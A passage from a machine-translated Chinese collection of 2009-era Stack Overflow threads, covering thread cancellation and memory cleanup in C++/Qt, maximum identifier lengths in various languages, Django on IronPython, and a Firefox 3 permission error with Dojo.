> 时间：2009-01-08T21:32:40.737

这个问题没有通用的解决方案。

一些可能的策略：

*   有时使用 shared_ptrs 和朋友会有所帮助
*   如果您不希望取消功能使您的算法混乱，请考虑抛出。抓住顶层函数并从那里清理。
*   无论您放在堆栈上而不是堆上，都不会导致泄漏
*   对于堆上在类之间有很多指针的大型结构，通常需要严格提供一种方法来释放整个内存结构。
*   您是否考虑在取消时丢弃的内存池中放置新的？

但无论如何，要有策略，否则你会感到痛苦。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-01-08T21:33:14.963

答案是这取决于您的操作的复杂性。

这里有几种方法。1）如前所述，在操作中放置一个“取消”标志，并让该操作定期（关闭）间隔轮询取消标志，可能至少与您更新进度条的频率一样。当用户点击取消时，然后点击取消例程。

现在，对于这种情况下的内存处理，我已经做了几种方法。我的偏好是使用智能指针或 STL 对象，它们会在超出范围时自行清理。基本上，在一个对象中声明你的对象，该对象有一个可以为你处理内存清理的析构函数；当您创建这些对象时，会为您创建内存，并且当对象超出范围时，内存会自动删除。您还可以添加诸如“处置”方法之类的东西来处理内存。它可能看起来像这样：

```
class MySmartPointer { 
     Object* MyObject;
     MySmartPointer() { MyObject = new Object(); }
     ~MySmartPointer() { if (MyObject != null) { delete MyObject; MyObject = null; }}
     void Dispose() { if (MyObject != null) { delete MyObject; MyObject = null; } }
     Object* Access() { return MyObject; }
 } 
```

如果您想变得非常聪明，可以将该类模板化为任何对象的通用模板，甚至可以具有数组等。当然，您可能必须在访问对象之前检查它是否已被释放，但是当您直接使用指针时它们会中断。您可能还可以内联 Access 方法，这样在执行期间就不会花费您的函数调用。

2) goto 方法。前面声明你的内存，最后delete，当你打cancel方法的时候，调用goto去到方法的最后。我认为某些程序员可能会为此对你处以私刑，因为 goto 被认为是非常糟糕的风格。因为我学习了基本和“goto 10”作为循环的一种方式，所以它并没有让我害怕，但你可能需要在代码审查期间回答一个学究，所以你最好有一个很好的解释为什么你选择这个而不是选项 1。

3）把它全部放入一个进程，而不是一个线程。如果可以的话，将所有信息序列化到磁盘上，然后在另一个程序中运行复杂的分析。如果那个程序死了，就这样吧，它不会破坏你的主应用程序，如果你的分析很复杂并且在 32 位机器上，你可能需要所有的内存空间来运行。而不是使用共享内存来传递进度信息，您只需将进度读/写到磁盘，并且取消是即时的。实现起来有点棘手，但并非不可能，而且可能更稳定。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-01-11T07:52:32.457

由于您使用的是 Qt，因此您可以利用 QObject 的父内存系统。

您说您在工作线程运行期间分配和释放内存。如果每个分配都是 QObject 的一个实例，为什么不把它作为当前 QThread 对象的父对象呢？

```
MyObject * obj = new MyObject( QThread::currentThread() ); 
```

您可以随时删除它们，这很好，但如果您遗漏了一些，它们将在 QThread 被释放时被清除。

请注意，当您告诉您的工作人员 QThread 取消时，您必须等待它完成，然后才能删除 QThread 实例。

```
workerThread->cancel();  // reqfuest that it stop
workerThread->wait();    // wait for it to complete
delete workerThread;     // deletes all child objects as well 
```

如果您使用 Simon Jensen 的回答来退出您的线程并使用 QObject 作为您的内存策略，我认为您的情况会很好。

# compiler-construction - 最大方法名称长度

> ID：425988
> 
> 赞同：44
> 
> 时间：2009-01-08T21:15:33.407
> 
> 标签：compiler-construction, programming-languages, specifications, name-length

有没有人碰巧知道在您选择的编程语言中方法名称的最大长度是多少？我打算把它作为一个 C# 特定的问题，但我认为很高兴了解整个范围。

还涉及哪些因素：

*   语言规范是否限制了这一点？
*   编译器将其限制在什么范围内？
    *   32位和64位机器有区别吗？

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2009-01-08T21:20:29.073

对于 C#，我不相信有*指定*的硬限制。（例如，C# 5 规范的第 2.4.2 节没有给出限制。）Roslyn v2.2.0.61624 似乎有 1024 个字符的限制；这远远超出了可读性的范围，甚至是一个合理的机器生成名称。

对于 Java，[规范的第 3.8 节](http://java.sun.com/docs/books/jls/third_edition/html/lexical.html#3.8)规定：

> 标识符是 Java 字母和 Java 数字的无限长度序列，其中第一个必须是 Java 字母。

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2009-01-08T21:33:38.393

PHP 似乎只受脚本内存限制的限制。

使用 128Mb，我能够创建一个包含 400 万个字符的类（和方法）。

```
<?php
ini_set('memory_limit', '128M');
$i = 1024 * 1024;

while ($i < 10000000)
{
    $className = str_repeat('i', $i);
    eval("class $className { public function $className() { echo '$i<br>'; } }");
    new $className();
    $i *= 2;
}

?> 
```

* * *

## 回答 #3

> 赞同：18
> 
> 时间：2011-03-28T19:10:15.167

我刚刚在 C# Visual Studio 2010 (x64) 中做了一个测试：做了一个标识符：

```
int a123456789a123...; 
```

并重复。在 512 个字符处，VS 给了我错误“标识符太长”。不过511还不错。（检查 Word 中的字符数。）

另一个例子：

```
int whyintheworldwouldyoueverhaveanidenfifierthislongitsreallyjustquiteridiculousimeancmonyoucouldatleasthavethecommoncourtesyofmakingitcamelcasesoitsnotsohardtoreadcmonjuststopnowyourereallyreachingtomakethisaslongaspossiblearentyou123412341234alrightwellthatsenoughnowisntitwelliguessnotbecauseimstillgoingthisisofficallytheworstidentifiereverಠ_ಠokaynowthatithasunicodeitsofficialbutseriouslythisthingissolongthatihadtogetupinthemiddleofittotakeabreakbeforesittingdowntofinishtoppingitofftothemaxcharlimitof___511; 
```

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2010-04-15T23:35:05.647

微软的 C# 实现是 511，VB.NET 实现是 1023。

Visual Studio 只会对标识符的前 511 个（对于 VB 为 1023 个）字符进行着色，并将其余字符保持黑色。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2009-01-08T21:43:41.087

Common Lisp 符号的名称是字符串；字符串的长度限制为`array-dimension-limit`

*的值`array-dimension-limit`是一个正整数，它是数组每个单独维度的上界。这个界限取决于实现，但不会小于 1024。（鼓励实现者在不牺牲性能的情况下使这个限制尽可能大。）*

在实践中，这可能非常大

```
Welcome to Clozure Common Lisp Version 1.3-dev-r11583M-trunk  (DarwinX8664)!
? array-dimension-limit
72057594037927936
? 

Welcome to Clozure Common Lisp Version 1.3-dev-r11583M-trunk  (DarwinX8632)!
? array-dimension-limit
16777216
? 
```

这个答案忽略了方法名的包名；这可以加倍长度。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2012-03-28T15:19:02.493

进行中 (OpenEdge) 限制为 32 个字符。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-01-08T21:55:16.523

在 DI 中不知道是这种情况，但我怀疑它是像 >100MB 这样的疯狂的东西。这可能是内存不足的事情。这是基于知道我和其他人已经遇到了符号名称的目标文件格式限制约为 11kB，并且该问题已得到修复。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-01-30T18:29:23.290

在 Java 中，我相信没有给出长度限制。 [请参阅在线 Sun Java 教程](http://java.sun.com/docs/books/tutorial/java/nutsandbolts/variables.html)：

> 变量名区分大小写。变量的名称可以是任何合法标识符——无限长度的 Unicode 字母和数字序列，以字母开头......

像上面的其他人一样，我猜长度取决于可用内存。

# python - IronPython 上的 Django

> ID：425990
> 
> 赞同：52
> 
> 时间：2009-01-08T21:16:01.737
> 
> 标签：python, django, ironpython

我有兴趣在 IronPython 上安装 Django，有没有人成功地让它运行并取得了一定程度的成功？

如果是这样，您能否谈谈您的经验、表现、建议一些技巧、资源和陷阱？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2009-02-05T22:40:08.427

[除了 Tony Meyer 提到的关于Django + IronPython](http://jdhardy.blogspot.com/2008/12/django-ironpython.html)的 Jeff Hardy 博客文章之外，还可以阅读 Jeff 在同一系列中关于他与 IronPython、easy_install 和 zlib 的斗争的另外两篇文章。第一个是[解决 zlib 问题](http://jdhardy.blogspot.com/2008/12/solving-zlib-problem-ironpythonzlib.html)，讨论 IronPython 没有 zlib；因此，没有easyinstall。Jeff 基于 ComponentAce 的 zlib.net 重新实现了 zlib。最后，在[IronPython 上的 easy_install 中，第二部分](http://jdhardy.blogspot.com/2008/12/easyinstall-on-ironpython-part-deux.html)Jeff 讨论了在将 easy_install 与 IronPython 一起使用之前需要进行的一些最终调整。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-01-08T22:20:23.713

[这是一个在 .NET 上运行并与 Django 一起使用的数据库提供程序](http://blogs.msdn.com/dinoviehland/archive/2008/03/17/ironpython-ms-sql-and-pep-249.aspx)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-02-03T23:17:20.010

这在去年的 PyCon 上进行[了演示](http://www.infoq.com/news/2008/03/django-and-ironpython)（也提供了[详细信息）。](http://blogs.msdn.com/dinoviehland/archive/2008/03/17/ironpython-ms-sql-and-pep-249.aspx)最近，[Jeff Hardy 写了一篇关于这个的博客](http://jdhardy.blogspot.com/2008/12/django-ironpython.html)，包括一些建议。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2010-10-06T07:51:45.403

我认为 Django 还没有在 IronPython 上工作，但我并不是说它不能完成。

[Django-ironpython](http://bitbucket.org/jdhardy/django-ironpython/overview)项目是目前正在进行的在 IronPython 上运行 Django 的工作。该项目在 2010 年 5 月 2 日 报告了[65.7% 的 sqlite 测试通过率。](http://twitter.com/#!/djangoipy)

# javascript - 为什么 FF3 说“获取属性 HTMLDivElement.tagName 的权限被拒绝”？

> ID：425996
> 
> 赞同：4
> 
> 时间：2009-01-08T21:18:03.557
> 
> 标签：javascript, dojo, firefox-3, inlineeditbox

当我通过 FireFox 3 运行它时：

```
<script type="text/javascript" src="../resources/dojo-1.2.3-src/dojo/dojo.js" djConfig="parseOnLoad: true"></script>
<script type="text/javascript" src="../resources/dojo-1.2.3-src/dojo/dijit.js"></script>

<script type="text/javascript">
dojo.require("dojo.parser");
dojo.require("dijit.InlineEditBox");
dojo.require("dijit.form.TextBox");

function myHandler(idOfBox, value) {
 alert("Edited value from "+idOfBox+" is now "+value);
}
</script>

<span id="editable" style="font-size:larger;" dojoType="dijit.InlineEditBox"
onChange="myHandler(this.id,arguments[0])">
<input dojoType="dijit.form.TextBox" value="dijit.InlineEditBox">
</span> 
```

并单击内联可编辑文本，对其进行更改，然后单击其外部，FF 表示：“Permission denied to get property HTMLDivElement.tagName”

Firebug 调试器在以下行中断，因为 e.relatedTarget 为空：

> 尝试{ e.relatedTarget.tagName; } 捕捉（e2）{ 返回；}

我能做些什么来解决这个问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-12T22:57:08.263

此问题*似乎是*由 Firefox 的 Firebug 扩展引起的。我这么说是因为当我禁用 Firebug 并使用该控件时，它可以正常工作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-09T05:44:20.820

是的，我自己尝试过，但它对我有用，至少针对最新的代码。（我在 FF3/mac 上运行。）

您提到的 try/catch 可能是一个红鲱鱼，因为已经有一个忽略任何错误的 catch 处理程序设置。*********